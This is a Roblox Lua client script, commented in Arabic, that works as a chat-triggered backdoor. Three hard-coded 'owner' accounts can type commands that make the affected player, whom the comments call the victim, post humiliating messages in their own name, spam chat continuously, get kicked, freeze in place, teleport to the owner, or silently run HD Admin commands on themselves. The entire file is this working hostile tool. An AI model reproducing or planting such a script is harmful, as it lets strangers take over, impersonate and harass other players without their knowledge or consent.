-- LocalScript داخل StarterPlayerScripts
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- الأونرات اللي نراقب شاتهم فقط (مهما كانوا فين)
local Owners = {
    ["1il5i"] = true,
    ["1il5f"] = true,
    ["eyad51533"] = true
}

-- الإيفنتات المستخدمة
local SendMessage = ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")
local HDAdminRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent")

-- متغيرات السبام والتجميد
local SpamTasks = {}
local IsFrozen = {}

-- دالة لتنفيذ الأوامر على الضحية (اللي عنده السكربت)
local function ExecuteCommand(commandOwnerName, msg)
    local args = string.split(string.lower(msg), " ")
    local cmd = args[1]

    -- منع الأونر من التأثر بنفسه
    if Owners[LocalPlayer.Name] then return end

    -- الأوامر
    if cmd == ".3mk" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            SendMessage:FireServer("عًمًىانًي اوًنًىرًاتً سُكًىًرًبتً زًحًىُفً 🥺")
        end

    elseif cmd == ".f7lk" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            SendMessage:FireServer("فحىًلًي ("..commandOwnerName..") اًهُهِ 🥺")
        end

    elseif cmd == ".kick" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            local reason = table.concat(args, " ", 3)
            if reason == "" then reason = "تم طردك من الاونرات" end
            LocalPlayer:Kick(reason)
        end

    elseif cmd == ".spam" and args[2] and args[3] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            local text = table.concat(args, " ", 3)
            if SpamTasks[LocalPlayer.UserId] then SpamTasks[LocalPlayer.UserId]:Disconnect() end
            SpamTasks[LocalPlayer.UserId] = RunService.Heartbeat:Connect(function()
                SendMessage:FireServer(text)
            end)
        end

    elseif cmd == ".unspam" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            if SpamTasks[LocalPlayer.UserId] then
                SpamTasks[LocalPlayer.UserId]:Disconnect()
                SpamTasks[LocalPlayer.UserId] = nil
            end
        end

    elseif cmd == ".say" and args[2] and args[3] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            local text = table.concat(args, " ", 3)
            SendMessage:FireServer(text)
        end

    elseif cmd == ".freeze" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            IsFrozen[LocalPlayer.UserId] = true
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.Anchored = true end

            LocalPlayer.CharacterAdded:Connect(function(newChar)
                task.wait(0.5)
                local newHrp = newChar:FindFirstChild("HumanoidRootPart")
                if newHrp and IsFrozen[LocalPlayer.UserId] then
                    newHrp.Anchored = true
                end
            end)
        end

    elseif cmd == ".unfreeze" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            IsFrozen[LocalPlayer.UserId] = nil
            local char = LocalPlayer.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.Anchored = false end
            end
        end

    elseif cmd == ".bring" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            local owner = Players:FindFirstChild(commandOwnerName)
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local hrp = char:WaitForChild("HumanoidRootPart")
                hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4)
            end
        end

    elseif cmd == ".cmd" and args[2] then
        local target = string.lower(args[2])
        if target == "all" or string.find(string.lower(LocalPlayer.Name), target) or string.find(string.lower(LocalPlayer.DisplayName), target) then
            local fullCmd = ".neon me .paint me pk .size me 3 .height me 0.1 .aura me .titlepk me اخبـار سـيـرفـركـم الـحـلـو"
            HDAdminRequest:InvokeServer(fullCmd)
        end
    end
end

-- مراقبة شات الأونرات من أي مكان
local function StartMonitoring()
    for _, plr in ipairs(Players:GetPlayers()) do
        if Owners[plr.Name] then
            plr.Chatted:Connect(function(msg)
                ExecuteCommand(plr.Name, msg)
            end)
        end
    end

    Players.PlayerAdded:Connect(function(plr)
        if Owners[plr.Name] then
            plr.Chatted:Connect(function(msg)
                ExecuteCommand(plr.Name, msg)
            end)
        end
    end)
end

-- بدء التنفيذ
StartMonitoring()
